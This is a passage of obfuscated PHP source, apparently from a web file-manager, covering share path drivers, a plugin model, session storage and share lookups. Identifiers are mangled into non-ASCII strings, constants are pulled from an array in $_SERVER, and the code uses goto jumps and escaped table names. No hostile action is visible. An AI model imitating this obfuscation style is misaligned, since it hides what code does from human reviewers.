$_SERVER[³½¬ÚË¯]; $Ó¡°¥Ğ = explode($¢Ã¬Òú[8], $ˆ«©ÁÍÇ); $óà¥Ò¤‡ = implode($¢Ã¬Òú[8], array_splice($Ó¡°¥Ğ, 1)); return $this->model->pathInfoByPath($Ó¡°¥Ğ[0], $óà¥Ò¤‡); } public function infoFull($ĞÄš²¹) { $™Ï¯Àîø = $this->infoFullSimple($ĞÄš²¹); return is_array($™Ï¯Àîø) ? $this->model->pathInfo($™Ï¯Àîø[$_SERVER[³½¬ÚË¯][181]]) : !1; } public function hashSimple($óŸ¶æ££) { $çäêªÍ¾ =& $_SERVER[³½¬ÚË¯]; $ Ÿêí«­ = $this->infoWithChildren($óŸ¶æ££); return $ Ÿêí«­[$çäêªÍ¾[517]][$çäêªÍ¾[641]]; } public function hashMd5($øîÆş‡¼) { $Ê­Â¾üú =& $_SERVER[³½¬ÚË¯]; $îŞ°µÂ = $this->infoWithChildren($øîÆş‡¼); return $îŞ°µÂ[$Ê­Â¾üú[517]][$Ê­Â¾üú[515]]; } public function exist($Ğ‘³ªÊ‡) { $Ú˜ÛÄÚ =& $_SERVER[³½¬ÚË¯]; $«õ‰§ = $this->parse($Ğ‘³ªÊ‡); if (!$«õ‰§[$Ú˜ÛÄÚ[84]]) { return $this->isFile($Ğ‘³ªÊ‡) || $this->isFolder($Ğ‘³ªÊ‡); } $†ÅÃ§Ùü = array($Ú˜ÛÄÚ[445] => $«õ‰§[$Ú˜ÛÄÚ[443]], $Ú˜ÛÄÚ[32] => $«õ‰§[$Ú˜ÛÄÚ[84]]); $Û¤˜ƒÊ— = $this->model->where($†ÅÃ§Ùü)->find(); return $Û¤˜ƒÊ— ? !0 : !1; } public function isFile($‘ÛÑÙùá) { $‡©îˆå¶ =& $_SERVER[³½¬ÚË¯]; $ÑğÒÈŞì = $this->infoSimple($‘ÛÑÙùá); return $ÑğÒÈŞì && $ÑğÒÈŞì[$‡©îˆå¶[453]] == $‡©îˆå¶[212] ? !0 : !1; } public function isFolder($É—şù§ı) { $ÔÆ¤ Ø =& $_SERVER[³½¬ÚË¯]; $»ÛôĞøÕ = $this->infoSimple($É—şù§ı); return $»ÛôĞøÕ && $»ÛôĞøÕ[$ÔÆ¤ Ø[453]] == $ÔÆ¤ Ø[88] ? !0 : !1; } public function listPath($ˆìä‚ïø, $µŸ´íÛÌ = false) { $­©æé‡ =& $_SERVER[³½¬ÚË¯]; if ($ˆìä‚ïø == $­©æé‡[12]) { return !1; } $Ç’äÄÀ = array($­©æé‡[445] => $ˆìä‚ïø); if ($µŸ´íÛÌ) { return $this->model->listSource($Ç’äÄÀ, -1); } return $this->model->listSource($Ç’äÄÀ); } public function has($ÁÉñ³®, $ã¶²¿ê• = false, $ô°¬¿Óş = null) { $œÍûÏ™É =& $_SERVER[³½¬ÚË¯]; $Ş”£Á¸“ = $this->infoWithChildren($ÁÉñ³®); if ($ã¶²¿ê•) { return array($œÍûÏ™É[224] => $Ş”£Á¸“[$œÍûÏ™É[224]], $œÍûÏ™É[223] => $Ş”£Á¸“[$œÍûÏ™É[223]]); } return $ô°¬¿Óş ? $Ş”£Á¸“[$œÍûÏ™É[224]] : $Ş”£Á¸“[$œÍûÏ™É[223]]; } public function listAll($¯•å‚‘) { $‘ãş©ŒŸ = IO::info($this->pathParse[$_SERVER[³½¬ÚË¯][84]]); if (!$‘ãş©ŒŸ) { return array(); } return $this->model->listAll($¯•å‚‘); } public function getContent($Ş¤á¸¸) { return $this->model->getContent($Ş¤á¸¸); } public function setContent($ãş“ä, $¨¬ñ¡ÛÏ = '') { return $this->model->setContent($ãş“ä, $¨¬ñ¡ÛÏ); } public function fileSubstr($¹ŸµŒõ, $ª…èâŒ¹, $Ç £‰À“) { return $this->model->fileSubstr($¹ŸµŒõ, $ª…èâŒ¹, $Ç £‰À“); } public function download($åş‡·¤ù, $¨‹¼¤Ëí = '') { $ßèü‡Ûê = get_path_father($¨‹¼¤Ëí); $Ë¡Ë­ = get_path_this($¨‹¼¤Ëí); $´‡ßû’ç = $this->model->fileInfoGet($åş‡·¤ù); $½§÷Ê‚œ = IO::copy($´‡ßû’ç[$_SERVER[³½¬ÚË¯][84]], $ßèü‡Ûê, !1, $Ë¡Ë­); return $½§÷Ê‚œ; } public function setModifyTime($Ö®‹‹», $”Ó¯é£Ê = '') { $éŠ¬…ÉÉ =& $_SERVER[³½¬ÚË¯]; if (!$Ö®‹‹») { return; } $this->model->where(array($éŠ¬…ÉÉ[459] => $Ö®‹‹»))->save(array($éŠ¬…ÉÉ[85] => $”Ó¯é£Ê)); } public function upload($•€¼¶Ïç, $»ú©œğÕ, $‰©™Ë“– = false, $øùòÀ­¿ = REPEAT_REPLACE) { $©µ¹ª¯Ï =& $_SERVER[³½¬ÚË¯]; $Ô·‰à¥Ä = $this->parse($•€¼¶Ïç); $Êñ‚óªô = $this->model->addFile($Ô·‰à¥Ä[$©µ¹ª¯Ï[443]], $»ú©œğÕ, $Ô·‰à¥Ä[$©µ¹ª¯Ï[84]], $‰©™Ë“–, $øùòÀ­¿); return $this->getPathOuter($Êñ‚óªô); } public function uploadFileByID($®èê¼Şş, $¡µ·…™’, $Ñ’º½Õ ) { $‰±³¤…™ =& $_SERVER[³½¬ÚË¯]; $²½³õ« = $this->parse($®èê¼Şş); $™öĞÊôä = $this->model->addFileByFileID($²½³õ«[$‰±³¤…™[443]], $¡µ·…™’, $²½³õ«[$‰±³¤…™[84]], $Ñ’º½Õ ); return $this->getPathOuter($™öĞÊôä); } public function addFileByRemote($Š¥ëÚ÷, $©‡ş…, $¿²ï­Ü® = array(), $¦Ü––û = '', $‚¡Û’) { $›çı‘±¤ =& $_SERVER[³½¬ÚË¯]; $Ï·ÖÂ¡à = $this->parse($Š¥ëÚ÷); $¦Ü––û = empty($¦Ü––û) ? $Ï·ÖÂ¡à[$›çı‘±¤[84]] : $¦Ü––û; $û‚âˆ‡ş = $this->model->addFileByRemote($Ï·ÖÂ¡à[$›çı‘±¤[443]], $©‡ş…, $¦Ü––û, $¿²ï­Ü®, $‚¡Û’); return $this->getPathOuter($û‚âˆ‡ş); } public function uploadLink($³­ëßúæ, $Ğ¸Ø®¿ª = 0) { $³ùñ©‰ =& $_SERVER[³½¬ÚË¯]; $µ´ÔºåÉ = $this->parse($³­ëßúæ); $Üİµïîó = _get($GLOBALS[$³ùñ©‰[7]], $³ùñ©‰[1377]); $áËÛ°À¤ = _get($GLOBALS[$³ùñ©‰[7]], $³ùñ©‰[1378]); $³­ëßúæ = Model($³ùñ©‰[643])->createFileName($µ´ÔºåÉ[$³ùñ©‰[84]], $Üİµïîó, $áËÛ°À¤); return IO::uploadLink($³­ëßúæ, $Ğ¸Ø®¿ª); } public function fileNameAuto($à½ºßŒ÷, $ê›×·„, $½à¶ôš¹ = REPEAT_REPLACE, $úÍ¡ÎöË = false) { return $this->model->fileNameAuto($à½ºßŒ÷, $ê›×·„, $½à¶ôš¹, $úÍ¡ÎöË); } public function fileNameExist($‘Ì­¿Ï‡, $í…¢ æ³) { return $this->model->fileNameExist($‘Ì­¿Ï‡, $í…¢ æ³); } protected function _fileOut($³…ƒˆŸ€, $Ç¾¢‰Š« = false, $¤¯’Ëñ = false, $£ŠÛ•Ÿë = '', $ óş­›¾ = false) { $îığÑØå =& $_SERVER[³½¬ÚË¯]; $Ì’éÍÚİ = $this->model->sourceInfo($³…ƒˆŸ€); if ($Ì’éÍÚİ[$îığÑØå[453]] == $îığÑØå[88]) { header($îığÑØå[1379]); die; } $ñÔÈŒ´ = $this->model->fileInfoGet($³…ƒˆŸ€); $£ŠÛ•Ÿë = $ñÔÈŒ´[$îığÑØå[515]] ? $ñÔÈŒ´[$îığÑØå[515]] : $£ŠÛ•Ÿë; $ÂÁ›Áå = is_array($GLOBALS[$îığÑØå[169]]) ? $GLOBALS[$îığÑØå[169]][$îığÑØå[32]] : $Ì’éÍÚİ[$îığÑØå[32]]; if ($ óş­›¾) { return IO::fileOutServer($ñÔÈŒ´[$îığÑØå[84]], $Ç¾¢‰Š«, $ÂÁ›Áå, $£ŠÛ•Ÿë); } IO::fileOut($ñÔÈŒ´[$îığÑØå[84]], $Ç¾¢‰Š«, $ÂÁ›Áå, $£ŠÛ•Ÿë); } public function fileOut($äÉêÔ÷, $²““©ê’ = false, $¶—†¡Ó = false, $‡×ö‹ì¾ = '') { $this->_fileOut($äÉêÔ÷, $²““©ê’, $¶—†¡Ó, $‡×ö‹ì¾); } public function fileOutServer($¬ÉÂ£•Æ, $„ˆŞÓëŒ = false, $ÈóšŞÆ® = false, $õÖ›Ã = '') { $this->_fileOut($¬ÉÂ£•Æ, $„ˆŞÓëŒ, $ÈóšŞÆ®, $õÖ›Ã, !0); } protected function _fileOutImage($á»Â£ Ñ, $¨Œ·åÆª = 250) { $Ëçƒü°ß =& $_SERVER[³½¬ÚË¯]; $ÃëŞ¡Ù³ = $this->model->pathInfo($á»Â£ Ñ); if ($ÃëŞ¡Ù³[$Ëçƒü°ß[453]] == $Ëçƒü°ß[88]) { show_json($Ëçƒü°ß[1380] . $á»Â£ Ñ, !1); } $Üèå˜÷Ë = $this->model->fileInfoGet($á»Â£ Ñ); $ÃëŞ¡Ù³[$Ëçƒü°ß[170]] = $Üèå˜÷Ë[$Ëçƒü°ß[84]]; $GLOBALS[$Ëçƒü°ß[169]] = $ÃëŞ¡Ù³; IO::fileOutImage($Üèå˜÷Ë[$Ëçƒü°ß[84]], $¨Œ·åÆª); } public function fileOutImage($˜«ŒÆ‹ƒ, $Óæ¦Ù‚¼ = 250) { $this->_fileOutImage($˜«ŒÆ‹ƒ, $Óæ¦Ù‚¼); } public function fileOutImageServer($Óˆş•×®, $ìıç½úÁ = 250) { $this->_fileOutImage($Óˆş•×®, $ìıç½úÁ); } public function link($çş”Á„, $ Ù‰©¬ = '') { $…£Ô©‹• = $this->model->fileInfoGet($çş”Á„); return IO::link($…£Ô©‹•[$_SERVER[³½¬ÚË¯][84]], $ Ù‰©¬); } protected function parse($şºÏú–ì) { $„éÎ½ =& $_SERVER[³½¬ÚË¯]; if (strstr($şºÏú–ì, $„éÎ½[8]) === !1) { return array($„éÎ½[461] => intval($şºÏú–ì), $„éÎ½[84] => $„éÎ½[12], $„éÎ½[1376] => array()); } $¾Ìºí”œ = explode($„éÎ½[8], trim($şºÏú–ì, $„éÎ½[8])); if (count($¾Ìºí”œ) < 2) { show_tips(clear_html($şºÏú–ì) . $„éÎ½[1381]); } return array($„éÎ½[461] => intval($¾Ìºí”œ[0]), $„éÎ½[84] => $¾Ìºí”œ[1], $„éÎ½[1376] => array_slice($¾Ìºí”œ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($›À³çøü) { $this->pathParse = $›À³çøü; $this->model = Model($_SERVER[³½¬ÚË¯][1375]); } public function getPathOuter($§Áš“•«) { $˜ı£ş¾Ù =& $_SERVER[³½¬ÚË¯]; if (!$§Áš“•«) { return $§Áš“•«; } $î¸¾üä = $this->parse($§Áš“•«); return trim(KodIO::makeShare($this->pathParse[$˜ı£ş¾Ù[443]], $î¸¾üä[$˜ı£ş¾Ù[443]]), $˜ı£ş¾Ù[8]); } protected function infoParse($‚Ñí±õî, $ìß§»ó³ = false, $€ñï = false) { $Ä­šñ¦€ =& $_SERVER[³½¬ÚË¯]; $¡Ñæ = $this->pathParse[$Ä­šñ¦€[443]]; $ô‹‹Ş = trim($this->pathParse[$Ä­šñ¦€[1211]], $Ä­šñ¦€[8]); return Action($Ä­šñ¦€[1382])->sharePathInfo($¡Ñæ, $ô‹‹Ş, $ìß§»ó³); } public function infoFull($™çÄ¿Ì) { $„ƒîéÆ‘ =& $_SERVER[³½¬ÚË¯]; $ßø¶ß”£ = explode($„ƒîéÆ‘[8], trim($™çÄ¿Ì, $„ƒîéÆ‘[8])); if (count($ßø¶ß”£) > 1) { $í†Î¢ØÊ = implode($„ƒîéÆ‘[8], array_splice($ßø¶ß”£, 1)); $½ÈôÉî = $this->model->pathInfoByPath($ßø¶ß”£[0], $í†Î¢ØÊ); if (!$½ÈôÉî) { return !1; } $this->pathParse[$„ƒîéÆ‘[1211]] = $½ÈôÉî[$„ƒîéÆ‘[181]]; } return $this->infoParse($™çÄ¿Ì); } public function listAll($”öËˆÑÙ) { $Ø•÷üÁ =& $_SERVER[³½¬ÚË¯]; $ÉÎó²ñÛ = IO::info($this->pathParse[$Ø•÷üÁ[84]]); if (!$ÉÎó²ñÛ) { return array(); } $¼éª°‹ = $this->model->listAll($”öËˆÑÙ); $Îá¶ˆ¬÷ = Model($Ø•÷üÁ[633])->getInfo($ÉÎó²ñÛ[$Ø•÷üÁ[634]]); foreach ($¼éª°‹ as &$İ¦‹¨øñ) { check_abort(); $İ¦‹¨øñ[$Ø•÷üÁ[87]] = Action($Ø•÷üÁ[1382])->_shareItemeParse($İ¦‹¨øñ[$Ø•÷üÁ[87]], $Îá¶ˆ¬÷); } unset($İ¦‹¨øñ); return $¼éª°‹; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($ ®¾ÌÇ§) { $this->pathParse = $ ®¾ÌÇ§; $this->model = Model($_SERVER[³½¬ÚË¯][1375]); } protected function infoParse($Üî‘Ğ–ˆ, $†»¼ô„¬ = false, $Õ´´šó = false) { $±¨¡†Šı =& $_SERVER[³½¬ÚË¯]; return Action($±¨¡†Šı[1217])->sharePathInfo($this->pathParse[$±¨¡†Šı[84]], !0, $†»¼ô„¬); } public function listPath($ˆû¥‚•€, $òé×ñË = false) { $ş×ô‚Úà =& $_SERVER[³½¬ÚË¯]; $²½û¤ç¯ = parent::listPath($ˆû¥‚•€, $òé×ñË); if (!$²½û¤ç¯) { return $²½û¤ç¯; } if (is_array($²½û¤ç¯[$ş×ô‚Úà[1383]])) { $²½û¤ç¯[$ş×ô‚Úà[1383]] = Action($ş×ô‚Úà[1217])->shareItemInfo($²½û¤ç¯[$ş×ô‚Úà[1383]]); } foreach ($²½û¤ç¯ as $‹÷¶Şş => $´èÕÀ“) { if (!in_array($‹÷¶Şş, array($ş×ô‚Úà[83], $ş×ô‚Úà[82]))) { continue; } foreach ($´èÕÀ“ as $€¿ê¥•Ç => $âëìÌ©û) { $²½û¤ç¯[$‹÷¶Şş][$€¿ê¥•Ç] = Action($ş×ô‚Úà[1217])->shareItemInfo($âëìÌ©û); } } return $²½û¤ç¯; } public function listAll($¡ûÇèŞû) { $Ä”…›ı‰ =& $_SERVER[³½¬ÚË¯]; $“«µ˜•½ = IO::info($this->pathParse[$Ä”…›ı‰[84]]); if (!$“«µ˜•½) { return array(); } $ƒÚÑª‡ = $this->model->listAll($¡ûÇèŞû); foreach ($ƒÚÑª‡ as &$•ÄÄ´­ì) { $•ÄÄ´­ì[$Ä”…›ı‰[87]] = Action($Ä”…›ı‰[1217])->shareItemInfo($•ÄÄ´­ì[$Ä”…›ı‰[87]]); } unset($•ÄÄ´­ì); return $ƒÚÑª‡; } } goto fñ§‹¿Ğˆ; aï©ÕÁÁ¼: class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\155\x2e\160\x6c\x75\x67\151\156\114\151\163\x74"; public $field = array("\156\x61\x6d\145", "\163\164\x61\164\165\163", "\x72\145\x67\151\x65\163\164", "\143\x6f\156\x66\x69\x67"); public function loadList($”¥Éô¯ = false) { $ÑıŞîšó = array_to_keyvalue($this->listData(), $_SERVER[³½¬ÚË¯][32]); if ($”¥Éô¯) { return $ÑıŞîšó[$”¥Éô¯]; } return $ÑıŞîšó; } public function init() { $åÁ¸ò” =& $_SERVER[³½¬ÚË¯]; Hook::trigger($åÁ¸ò”[2008]); $Ş­¨ëÃü = $this->loadPluginList(); foreach ($Ş­¨ëÃü as $´¨şŒæ³ => $òî¨Ãİª) { $ğİ£–ü¥ = $this->appAllow($´¨şŒæ³, $òî¨Ãİª); if (!$ğİ£–ü¥) { continue; } foreach ($òî¨Ãİª[$åÁ¸ò”[2009]] as $İ³‰ú¢Û => $ØÕØ“Òç) { Hook::bind($İ³‰ú¢Û, $ØÕØ“Òç); } } Hook::trigger($åÁ¸ò”[2010]); Hook::trigger(ACTION); } public function appAllow($Í®úÂí¥, $Ç½è…Í, $ˆÜûªµ = true) { $àóÄ×È =& $_SERVER[³½¬ÚË¯]; $°€îÄñÏ = PLUGIN_DIR . $Í®úÂí¥ . $àóÄ×È[2011]; if (!is_array($Ç½è…Í) || !is_array($Ç½è…Í[$àóÄ×È[2009]]) || $Ç½è…Í[$àóÄ×È[786]] != 1 || !is_file($°€îÄñÏ)) { return !1; } if ($GLOBALS[$àóÄ×È[537]] == 1) { if ($GLOBALS[$àóÄ×È[6]][$àóÄ×È[2012]] || !$GLOBALS[$àóÄ×È[6]][$àóÄ×È[2013]]) { return !0; } $ÊğÒ–ŒŠ = explode($àóÄ×È[50], strtolower($GLOBALS[$àóÄ×È[6]][$àóÄ×È[2013]])); return in_array(strtolower($Í®úÂí¥), $ÊğÒ–ŒŠ) ? !1 : !0; } if ($ˆÜûªµ && !Action($àóÄ×È[2014])->checkAuth($Í®úÂí¥)) { return !1; } return !0; } public function unInstall($ÌµüÙ—) { $šöØıĞ =& $_SERVER[³½¬ÚË¯]; $‡å®¸Ä = $this->loadList($ÌµüÙ—); if (file_exists(PLUGIN_DIR . $ÌµüÙ—)) { Hook::apply($ÌµüÙ— . $šöØıĞ[2015]); } $this->remove($‡å®¸Ä[$šöØıĞ[443]]); } public function changeStatus($êåŒï¶Ü, $õŞ—İİâ) { $§§ğã¦ =& $_SERVER[³½¬ÚË¯]; $Ä¼Â‚„ä = $this->loadList($êåŒï¶Ü); if ($õŞ—İİâ) { Hook::apply($êåŒï¶Ü . $§§ğã¦[2016]); } $this->update($Ä¼Â‚„ä[$§§ğã¦[443]], array($§§ğã¦[2017] => $õŞ—İİâ)); } public function appRegist($¿ªÌĞ¶¬, $ÏË°å‚â) { $°íÜ®ÛÏ =& $_SERVER[³½¬ÚË¯]; $ªû×ø¦Û = $this->loadList($¿ªÌĞ¶¬); if ($ªû×ø¦Û) { $this->update($ªû×ø¦Û[$°íÜ®ÛÏ[443]], array($°íÜ®ÛÏ[2009] => $ÏË°å‚â)); } else { $¯€…ì‚– = array($°íÜ®ÛÏ[32] => $¿ªÌĞ¶¬, $°íÜ®ÛÏ[2009] => $ÏË°å‚â, $°íÜ®ÛÏ[786] => 0, $°íÜ®ÛÏ[6] => $this->getConfigDefault($¿ªÌĞ¶¬)); $this->insert($¯€…ì‚–); } } public function getConfigDefault($È‰Ô†»ö) { $Â™’¯Î× =& $_SERVER[³½¬ÚË¯]; $Ä‡…ù™ï = array(); $±Ÿìããæ = $this->getPackageJson($È‰Ô†»ö); if (!$±Ÿìããæ && is_array($±Ÿìããæ[$Â™’¯Î×[2018]])) { return $Ä‡…ù™ï; } foreach ($±Ÿìããæ[$Â™’¯Î×[2018]] as $·±ÕÁ¸¨ => $“ĞË˜Íé) { if (!isset($“ĞË˜Íé[$Â™’¯Î×[418]]) || isset($Ä‡…ù™ï[$·±ÕÁ¸¨])) { continue; } $Ä‡…ù™ï[$·±ÕÁ¸¨] = $“ĞË˜Íé[$Â™’¯Î×[418]]; } return $Ä‡…ù™ï; } public function getPackageJson($šÜàØ¢) { return Hook::apply($šÜàØ¢ . $_SERVER[³½¬ÚË¯][2019]); } public function getConfig($ÔÕôÉÕİ, $Óñ½í× = false) { $®é»¹ÓÇ =& $_SERVER[³½¬ÚË¯]; $Ïúñå…È = array(); $üì«×˜œ = $this->loadList($ÔÕôÉÕİ); if ($üì«×˜œ && is_array($üì«×˜œ[$®é»¹ÓÇ[6]])) { $Ïúñå…È = $üì«×˜œ[$®é»¹ÓÇ[6]]; } if (!$Ïúñå…È || $Óñ½í×) { $Ïúñå…È = $this->getConfigDefault($ÔÕôÉÕİ); } return $Ïúñå…È; } public function setConfig($ÅõÇ«, $˜Ë¤± = false) { $õèÙñÅÄ =& $_SERVER[³½¬ÚË¯]; $¯‰±Ì¥Ç = $this->loadList($ÅõÇ«); if (!$¯‰±Ì¥Ç) { return !1; } $ÊŸÕÊ¡ç = $¯‰±Ì¥Ç[$õèÙñÅÄ[6]]; if ($˜Ë¤± == !1) { $ÊŸÕÊ¡ç = array(); $˜Ë¤± = $this->getConfigDefault($ÅõÇ«); } foreach ($˜Ë¤± as $ÕıŸ¾ø => $Ó©İŞÎ) { $ÊŸÕÊ¡ç[$ÕıŸ¾ø] = is_string($Ó©İŞÎ) ? trim($Ó©İŞÎ) : $Ó©İŞÎ; } $this->update($¯‰±Ì¥Ç[$õèÙñÅÄ[443]], array($õèÙñÅÄ[6] => $ÊŸÕÊ¡ç)); } public function viewList() { $£¤Ë–¡é =& $_SERVER[³½¬ÚË¯]; $İëñ‚ï† = $this->loadList(); $this->pluginScan($İëñ‚ï†); $İëñ‚ï† = $this->loadPluginList(); $‚İ³ş˜ = array(); foreach ($İëñ‚ï† as $–ƒ•Ğ¡¤ => $ÙÏ®ª€²) { unset($ÙÏ®ª€²[$£¤Ë–¡é[2009]], $ÙÏ®ª€²[$£¤Ë–¡é[6]]); $¶Åªœ×Á = PLUGIN_DIR . $ÙÏ®ª€²[$£¤Ë–¡é[32]] . $£¤Ë–¡é[2011]; if (!is_file($¶Åªœ×Á)) { continue; } $Ú„ßâ£Ø = Hook::apply($ÙÏ®ª€²[$£¤Ë–¡é[32]] . $£¤Ë–¡é[2019]); if (is_array($Ú„ßâ£Ø)) { $‚İ³ş˜[$–ƒ•Ğ¡¤] = array_merge($ÙÏ®ª€², $Ú„ßâ£Ø); } } return $‚İ³ş˜; } private function loadPluginList() { $„ñç =& $_SERVER[³½¬ÚË¯]; $Áîæª = $this->loadList(); if (strtolower(MOD) == $„ñç[2020]) { return $Áîæª; } $©ğ‡†¹ = Hook::trigger($„ñç[2021], $Áîæª); if ($Áîæª && !$©ğ‡†¹) { die; } return $©ğ‡†¹ ? $©ğ‡†¹ : $Áîæª; } private function pluginScan($™©ÈĞıå) { $Ôü¥ŠÕ· =& $_SERVER[³½¬ÚË¯]; recursion_dir(PLUGIN_DIR, $ÁÊ‡È¡ò, $§è¿Ôü¿, 0); foreach ($ÁÊ‡È¡ò as $˜²á‘£ô) { $£²¸Ù¤… = get_path_this($˜²á‘£ô); if (isset($™©ÈĞıå[$£²¸Ù¤…]) || !file_exists($˜²á‘£ô . $Ôü¥ŠÕ·[2022]) || !file_exists($˜²á‘£ô . $Ôü¥ŠÕ·[2011])) { continue; } Hook::apply($£²¸Ù¤… . $Ôü¥ŠÕ·[2016]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\x79\x73\x74\145\x6d\x5f\x73\x65\163\x73\x69\157\x6e"; public function get($¨Ÿîì¸¦) { $…õòöøÛ =& $_SERVER[³½¬ÚË¯]; $ÂèñÎˆç = $this->where(array($…õòöøÛ[2023] => $¨Ÿîì¸¦))->find(); if (!is_array($ÂèñÎˆç)) { return !1; } return $ÂèñÎˆç[$…õòöøÛ[790]]; } public function set($Àã“¦„–, $ƒ¶Ç”ûÑ, $÷‘‘·Ş = 3600) { $¥û±şÇ‡ =& $_SERVER[³½¬ÚË¯]; $Ğó»òä› = array($¥û±şÇ‡[2023] => $Àã“¦„–, $¥û±şÇ‡[1927] => $ƒ¶Ç”ûÑ, $¥û±şÇ‡[2024] => $÷‘‘·Ş + time()); if (Session::get($¥û±şÇ‡[2025])) { $Ğó»òä›[$¥û±şÇ‡[1690]] = Session::get($¥û±şÇ‡[2025]); } else { $Ğó»òä›[$¥û±şÇ‡[1690]] = 0; } if ($this->get($Àã“¦„–)) { return $this->where(array($¥û±şÇ‡[2023] => $Àã“¦„–))->save($Ğó»òä›); } else { return $this->add($Ğó»òä›, array(), !0); } } public function remove($”À……àŞ) { return $this->where(array($_SERVER[³½¬ÚË¯][2023] => $”À……àŞ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[³½¬ÚË¯][2026] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\150\x61\x72\x65"; protected $dataAuto = array(array("\x6d\x6f\144\x69\x66\x79\x54\151\x6d\145", "\x74\151\x6d\x65", "\151\x6e\163\145\x72\x74\x2c\165\x70\x64\141\x74\145", "\x66\165\x6e\143\164\x69\157\156"), array("\x63\x72\x65\141\x74\145\x54\151\155\145", "\164\151\x6d\x65", "\x69\156\x73\x65\162\164", "\146\165\x6e\x63\x74\x69\x6f\x6e"), array("\x6f\x70\164\151\x6f\156\x73", '', "\151\156\163\x65\162\x74\54\x75\x70\144\141\164\x65\x2c\x73\145\154\x65\x63\164", "\x6a\163\x6f\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($¼Ô±Éëë) { $˜³–Îíİ =& $_SERVER[³½¬ÚË¯]; $ŸÒÑ²À² = isset($¼Ô±Éëë[0]) ? $¼Ô±Éëë[0] : !1; return array($˜³–Îíİ[2027] => array(USER_ID, $˜³–Îíİ[2028]), $˜³–Îíİ[1968] => array($ŸÒÑ²À², $˜³–Îíİ[2029])); } protected function listSimple() { $‘•ÒÉÛ´ = array($_SERVER[³½¬ÚË¯][1690] => USER_ID); $ñ‚ÑùÄ¿ = $this->field($this->fieldList)->where($‘•ÒÉÛ´)->select(); return $ñ‚ÑùÄ¿ ? $ñ‚ÑùÄ¿ : array(); } protected function getInfo($åÊÓ·Èö, $¶ı‘¾ã¾ = false) { $©åû°‚Ë =& $_SERVER[³½¬ÚË¯]; if ($¶ı‘¾ã¾) { return $this->_getShareInfo(array($©åû°‚Ë[634] => $åÊÓ·Èö)); } $å“´ş¬ = $this->cacheFunctionGet($©åû°‚Ë[1970], $åÊÓ·Èö); return $å“´ş¬; } public function getInfoByHash($öáÜÎ¬¦) { return $this->_getShareInfo(array($_SERVER[³½¬ÚË¯][2030] => $öáÜÎ¬¦)); } public function getInfoByPath($¥ïëš©à) { $ëüÆÏŒ =& $_SERVER[³½¬ÚË¯]; $‚È¾ï‘ = array($ëüÆÏŒ[1690] => USER_ID, $ëüÆÏŒ[181] => $¥ïëš©à); return $this->_getShareInfo($‚È¾ï‘); } public function getInfoBySourcePath($ûÄâ÷–¥) { $«ÕŒªÜ =& $_SERVER[³½¬ÚË¯]; $† ±ê­³ = array($«ÕŒªÜ[1690] => USER_ID, $«ÕŒªÜ[1218] => $ûÄâ÷–¥); return $this->_getShareInfo($† ±ê­³); } private function _getShareInfo($É°Ã“ÃÎ) { $‡Œõì‘´ =& $_SERVER[³½¬ÚË¯]; $ÌÓÄŠô“ = $this->where($É°Ã“ÃÎ)->find(); if (!$ÌÓÄŠô“) { return !1; } $É°Ã“ÃÎ = array($‡Œõì‘´[634] => $ÌÓÄŠô“[$‡Œõì‘´[634]]); $†·­Ë™â = $‡Œõì‘´[2031]; $ãÛÅâ×“ = Model($‡Œõì‘´[635])->order($‡Œõì‘´[443])->field($†·­Ë™â)->where($É°Ã“ÃÎ)->select(); if ($ÌÓÄŠô“[$‡Œõì‘´[181]] == $‡Œõì‘´[212]) { $ÌÓÄŠô“[$‡Œõì‘´[87]] = IO::info($ÌÓÄŠô“[$‡Œõì‘´[1218]]); } else { $ÌÓÄŠô“[$‡Œõì‘´[87]] = Model($‡Œõì‘´[1375])->pathInfo($ÌÓÄŠô“[$‡Œõì‘´[181]]); } $ÌÓÄŠô“[$‡Œõì‘´[2032]] = $ãÛÅâ×“; return $ÌÓÄŠô“; } protected function getInfoAuth($§—›Şµœ) { $„ÁÏ¾Ú‚ =& $_SERVER[³½¬ÚË¯]; $’šÖ©¾ı = $this->getInfo($§—›Şµœ); if ($’šÖ©¾ı[$„ÁÏ¾Ú‚[1690]] == USER_ID) { $’šÖ©¾ı[$„ÁÏ¾Ú‚[455]] = $’šÖ©¾ı[$„ÁÏ¾Ú‚[87]][$„ÁÏ¾Ú‚[455]]; } else { $’šÖ©¾ı[$„ÁÏ¾Ú‚[455]] = Model($„ÁÏ¾Ú‚[536])->authMake($’šÖ©¾ı[$„ÁÏ¾Ú‚[2032]]); } return $’šÖ©¾ı; } protected function listData($¢ùà°‹¶ = null, $ı˜åö§† = 300) { $üı€ĞÍ´ =& $_SERVER[³½¬ÚË¯]; $Ğš•ç¿® = array(array($üı€ĞÍ´[531] => array($üı€ĞÍ´[1055], 0), $üı€ĞÍ´[632] => array($üı€ĞÍ´[1055], 0), $üı€ĞÍ´[2033] => $üı€ĞÍ´[1986])); if ($¢ùà°‹¶ == $üı€ĞÍ´[2034]) { $Ğš•ç¿® = array($üı€ĞÍ´[531] => 1); } else { if ($¢ùà°‹¶ == $üı€ĞÍ´[1204]) { $Ğš•ç¿® = array($üı€ĞÍ´[632] => 1); } } $Ğš•ç¿®[$üı€ĞÍ´[1690]] = USER_ID; $åò×¨û = $this->where($Ğš•ç¿®)->selectPage($ı˜åö§†); return $åò×¨û; } protected function listToMe($ğ«ÑÜºÜ = 300) { $¡¯ øÊ =& $_SERVER[³½¬ÚË¯]; $ˆÚŒıÂÀ = Model($¡¯ øÊ[2035])->userGroupParents(USER_ID); $ÑèŒÛï = array($¡¯ øÊ[617] => SourceModel::TYPE_USER, $¡¯ øÊ[539] => USER_ID); if ($ˆÚŒıÂÀ) { $ÑèŒÛï = array(array($¡¯ øÊ[617] => SourceModel::TYPE_USER, $¡¯ øÊ[539] => USER_ID), array($¡¯ øÊ[617] => SourceModel::TYPE_GROUP, $¡¯ øÊ[539] => array($¡¯ øÊ[7], $ˆÚŒıÂÀ)), $¡¯ øÊ[2033] => $¡¯ øÊ[1986]); } $©šÔ÷ÈÔ = Model($¡¯ øÊ[635])->where($ÑèŒÛï)->selectPage($ğ«ÑÜºÜ); $üÑª€Ò³ = array_to_keyvalue_group($©šÔ÷ÈÔ[$¡¯ øÊ[413]], $¡¯ øÊ[634]); if (!$üÑª€Ò³) { return 